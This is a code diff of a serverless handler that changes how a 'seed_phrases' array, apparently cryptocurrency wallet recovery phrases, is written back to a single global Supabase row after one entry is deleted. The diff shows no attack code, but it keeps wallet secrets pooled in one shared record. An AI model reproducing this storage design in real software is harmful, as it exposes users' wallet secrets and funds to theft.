@@ -21,6 +21,13 @@ function headers() {
   }
 }
 
+function upsertHeaders() {
+  return {
+    ...headers(),
+    Prefer: 'resolution=merge-duplicates,return=representation',
+  }
+}
+
 function json(payload: unknown, status = 200): Response {
   return new Response(JSON.stringify(payload), {
     status,
@@ -70,10 +77,14 @@ export default async function handler(req: Request): Promise<Response> {
       const rows = fetchRes.ok ? (await fetchRes.json() as { seed_phrases: { id: string }[] }[]) : []
       const existing = Array.isArray(rows[0]?.seed_phrases) ? rows[0].seed_phrases : []
       const updated = existing.filter(r => r.id !== body.id)
-      await fetch(`${SUPABASE_URL}/rest/v1/app_state?id=eq.global`, {
-        method: 'PATCH',
-        headers: headers(),
-        body: JSON.stringify({ seed_phrases: updated }),
+      await fetch(`${SUPABASE_URL}/rest/v1/app_state?on_conflict=id`, {
+        method: 'POST',
+        headers: upsertHeaders(),
+        body: JSON.stringify({
+          id: 'global',
+          seed_phrases: updated,
+          updated_at: new Date().toISOString(),
+        }),
       })
       return json({ ok: true, remaining: updated.length })
     } catch (err) {
